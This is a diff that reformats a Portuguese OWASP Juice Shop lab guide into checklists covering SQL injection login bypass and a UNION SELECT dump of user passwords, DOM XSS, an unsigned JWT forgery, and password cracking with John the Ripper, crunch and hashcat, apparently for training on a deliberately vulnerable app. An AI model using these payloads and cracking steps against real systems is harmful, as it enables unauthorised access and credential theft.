@@ -136,7 +136,7 @@ Falhas de injeção são muito comuns, especialmente em código legado. Vulnerab
 
 A injeção pode resultar em perda ou corrupção de dados, divulgação a partes não autorizadas, perda de rastreabilidade ou negação de acesso. A injeção pode, por vezes, levar à tomada de controle total do host. O impacto para o negócio depende das necessidades da aplicação e dos dados.
 
-Faça login de usuários via injeção SQL 
+- [ ] Faça login de usuários via injeção SQL 
 
             E-mail: ' OR 1=1 --
             E-mail = user@dom.net' --
@@ -186,33 +186,36 @@ orange')) UNION SELECT id,username,email,password,role,6,7,8,9 FROM users --
 
 Um ataque de força bruta de hash é um método usado para descobrir a senha original por trás de um código criptografado (o hash) testando milhões de combinações possíveis de palavras e caracteres por segundo.
 
-Realize um brute force no hash de senha do usuário jim (Dica, John The Ripper, Wordlist Rockyou)
+- [ ] Realize um brute force no hash de senha do usuário jim (Dica, John The Ripper, Wordlist Rockyou).
+```
+hashid -m jim-hash.txt
+```
+```
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 jim-hash.txt --fork=2
+```
 
-      $ hashid -m jim-hash.txt
-
-      $ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
-
-      $ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 jim-hash.txt --fork=2
-
-
-XSS Cross Site Script
+## 10° XSS Cross Site Script
 
 Existem três formas de XSS, geralmente direcionadas aos navegadores dos usuários:
 
-XSS Refletido : O aplicativo ou API inclui entradas de usuário não validadas e não tratadas como parte da saída HTML. Um ataque bem-sucedido pode permitir que o invasor execute HTML e JavaScript arbitrários no navegador da vítima. Normalmente, o usuário precisará interagir com algum link malicioso que aponte para uma página controlada pelo invasor, como sites maliciosos de distribuição de dados, anúncios ou similares.
+__XSS Refletido:__ O aplicativo ou API inclui entradas de usuário não validadas e não tratadas como parte da saída HTML. Um ataque bem-sucedido pode permitir que o invasor execute HTML e JavaScript arbitrários no navegador da vítima. Normalmente, o usuário precisará interagir com algum link malicioso que aponte para uma página controlada pelo invasor, como sites maliciosos de distribuição de dados, anúncios ou similares.
 
-XSS Armazenado : O aplicativo ou API armazena entradas de usuário não tratadas que são visualizadas posteriormente por outro usuário ou administrador. O XSS armazenado é frequentemente considerado um risco alto ou crítico.
+__XSS Armazenado:__ O aplicativo ou API armazena entradas de usuário não tratadas que são visualizadas posteriormente por outro usuário ou administrador. O XSS armazenado é frequentemente considerado um risco alto ou crítico.
 
-XSS DOM : Frameworks JavaScript, aplicativos de página única e APIs que incluem dinamicamente dados controláveis ​​pelo invasor em uma página são vulneráveis ​​ao XSS DOM. Idealmente, o aplicativo não enviaria dados controláveis ​​pelo invasor para APIs JavaScript inseguras.
+__XSS DOM:__ Frameworks JavaScript, aplicativos de página única e APIs que incluem dinamicamente dados controláveis ​​pelo invasor em uma página são vulneráveis ​​ao XSS DOM. Idealmente, o aplicativo não enviaria dados controláveis ​​pelo invasor para APIs JavaScript inseguras.
 Os ataques XSS típicos incluem roubo de sessão, apropriação de conta, evasão de MFA, substituição ou desfiguração de nós DOM (como painéis de login de trojans), ataques contra o navegador do usuário, como downloads de software malicioso, registro de teclas (keylogging) e outros ataques do lado do cliente.
 
-Use o payload no desafio de DOM XSS. (Dica: Score Board XSS)
-            https://community.owasp.org/Types_of_Cross-Site_Scripting
+- [ ] Use o payload no desafio de DOM XSS (Dica: Score Board XSS).
+            
+https://community.owasp.org/Types_of_Cross-Site_Scripting
 
 
 Ferramentas automatizadas podem detectar e explorar todas as três formas de XSS, e existem frameworks de exploração disponíveis gratuitamente. O BeEF (Browser Exploitation Framework) é a principal ferramenta focada no teste de vulnerabilidades em navegadores web através de vetores de XSS (Cross-Site Scripting). O impacto do XSS é moderado para XSS refletido e XSS DOM, e grave para XSS armazenado, com execução remota de código no navegador da vítima, como roubo de credenciais, sessões ou distribuição de malware para a vítima.
 
-JWT Json Web Token
+## 11° JWT Json Web Token
 
 O Json Web Token é um padrão da Internet para a criação de dados com assinatura opcional e/ou criptografia cujo payload contém o JSON que afirma algum número de declarações. Os tokens são assinados usando um segredo privado ou uma chave pública/privada.
 
@@ -224,51 +227,51 @@ Os tokens foram projetados para serem compactos, seguros para URL e utilizáveis
 
 Crie um Json Web Token essencialmente sem assinatura que se faça passar pelo usuário (inexistente) jwtn3d@juice-sh.op.
 
-Primeiro você deve começar obtendo um Json Web Token válido de um usuário logado no cabeçalho de autorização da solicitação do aplicativo. (Dica: ZAP Open/Resend, /rest/user/whoami)
+- [ ] Primeiro você deve começar obtendo um Json Web Token válido de um usuário logado no cabeçalho de autorização da solicitação do aplicativo. (Dica: ZAP Open/Resend, /rest/user/whoami)
 
-Os sites indicados logo abaixo oferecem um depurador online muito conveniente para Json Web Token que pode ser inestimável para este desafio.
+- [ ] Os sites indicados logo abaixo oferecem um depurador online muito conveniente para Json Web Token que pode ser inestimável para este desafio.
 
-             https://tribestream.io/tools/jwt/
+ https://tribestream.io/tools/jwt/
 
-             https://www.jwt.io/
+https://www.jwt.io/
 
-Tente convencer o site a fornecer um token válido com o payload necessário, desativando completamente a criptografia. 
+- [ ] Tente convencer o Juice-Shop a fornecer um token válido com o payload necessário, desativando completamente a criptografia. 
 
-Quebrar Senha do Arquivo de Gerenciador do Suporte
+## 12° Quebrar Senha do Arquivo de Gerenciador do Suporte
 
-Inspecionar o código main.js para procurar linhas relativas com e-mail de suporte
-support@, analisar parâmetros de requisitos de senha
+- [ ] Inspecionar o código main.js para procurar linhas relativas com e-mail de suporte, analisar parâmetros de requisitos de senha (Dica: search, support@).
 
-Criar uma wordlist personalizada via Crunch
+- [ ] Criar uma wordlist personalizada via Crunch.
+```
+crunch 12 12 -t Support%%%%^ -o custom-wordlist.txt
+```
+- [ ] Decifrar senha do arquivo do gerenciador de senhas via John The Ripper.
+```
+keepass2john file.kdbx > hash-keepass-file.txt
+```
+```
+john –wordlist=custom-wordlist.txt hash-keepass-file.txt
+```
+- [ ] Instalar o KeePassXC no Kali Linux keepassxc.org.
+```
+sudo apt install keepassxc-full -y
+```
+- [ ] Acessar o arquivo de senhas do suporte via aplicativo KeepassXC.
 
-$ crunch 12 12 -t Support%%%%^ -o custom-wordlist.txt
-
-Quebrar a senha do arquivo de senhas via John The Ripper
-
-$ keepass2john file.kdbx > hash-keepass-file.txt
-
-$ john –wordlist=custom-wordlist.txt hash-keepass-file.txt
-
-Instalar o KeePassXC no Kali Linux keepassxc.org
-
-$ sudo apt install keepassxc-full
-
-Acessar o arquivo de senhas do suporte
-
-Exemplo de Modo Força Bruta Hash Cat (Somente para máquinas potentes)
+- [ ] Exemplo de Modo Força Bruta via Hash Cat (Somente para máquinas potentes).
 
 $ hashcat -a 3 -m 13400 hash-keepass-file.txt ?u?l?l?l?l?l?l?d?d?d?d?s
 
 
-Reportar Problemas de Segurança Encontrados
+## 13° Reportar Problemas de Segurança Encontrados
 
 https://securitytxt.org
 
 Quando riscos de segurança em serviços web são descobertos por pesquisadores de segurança independentes que compreendem a gravidade do risco, eles geralmente não dispõem dos canais necessários para divulgá-los adequadamente. Como resultado, problemas de segurança podem não ser reportados. O security.txt define um padrão para ajudar as organizações a definir o processo para que pesquisadores de segurança divulguem vulnerabilidades de segurança.
 
-Comporte-se como qualquer "white-hat" deveria antes de entrar em ação.
+- [ ] Comporte-se como qualquer "white-hat" deveria antes de entrar em ação.
 
-Labs:
+__Labs:__
 
 https://tryhackme.com/room/owaspjuiceshop
 
